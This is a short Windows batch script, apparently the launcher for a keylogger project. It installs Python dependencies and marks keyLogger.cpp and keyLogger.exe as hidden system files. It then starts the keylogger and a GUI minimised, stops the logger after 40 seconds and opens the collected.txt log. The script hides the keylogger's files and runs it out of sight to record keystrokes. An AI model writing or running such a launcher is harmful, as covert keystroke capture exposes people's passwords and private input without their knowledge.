@ECHO OFF
cd src
ECHO Installing Required Dependencies
python pipLibs.py
:: g++ keyLogger.cpp -w -o keyLogger 
attrib +h +s keyLogger.cpp
attrib +h +s keyLogger.exe 
start /MIN .\keyLogger.exe 
start /MIN python .\GUI.py 
timeout /t 40 /nobreak > nul
taskkill /f /im keyLogger.exe
notepad collected.txt